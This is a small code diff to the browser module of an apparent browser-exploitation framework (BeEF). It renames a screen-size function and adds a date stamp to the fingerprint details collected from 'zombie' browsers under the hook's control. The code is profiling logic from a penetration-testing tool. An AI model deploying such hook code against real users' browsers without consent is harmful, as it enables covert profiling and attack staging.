@@ -714,7 +714,7 @@ beef.browser = {
 	/**
 	 * Returns zombie screen size and color depth.
 	 */	
-	getScreenParams: function() {
+	getScreenSize: function() {
 		return {
 			width: window.screen.width, 
 			height: window.screen.height,
@@ -763,10 +763,11 @@ beef.browser = {
 		var hostname = document.location.hostname;
 		var hostport = (document.location.port)? document.location.port : "80";
 		var browser_plugins = beef.browser.getPlugins();
+		var date_stamp = new Date().toString();
 		var os_name = beef.os.getName();
 		var system_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
 		var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {if (value == true) return value; else if (typeof value == 'object') return value; else return;});
-		var screen_params = beef.browser.getScreenParams();
+		var screen_size = beef.browser.getScreenSize();
 		var window_size = beef.browser.getWindowSize();
 		var java_enabled = (beef.browser.javaEnabled())? "Yes" : "No";
 		var vbscript_enabled=(beef.browser.hasVBScript())? "Yes" : "No";
@@ -788,9 +789,10 @@ beef.browser = {
 		if(hostport) details["HostPort"] = hostport;
 		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
 		if(os_name) details['OsName'] = os_name;
+		if(date_stamp) details['DateStamp'] = date_stamp;
 		if(system_platform) details['SystemPlatform'] = system_platform;
 		if(browser_type) details['BrowserType'] = browser_type;
-		if(screen_params) details['ScreenParams'] = screen_params;
+		if(screen_size) details['ScreenSize'] = screen_size;
 		if(window_size) details['WindowSize'] = window_size;
 		if(java_enabled) details['JavaEnabled'] = java_enabled;
 		if(vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
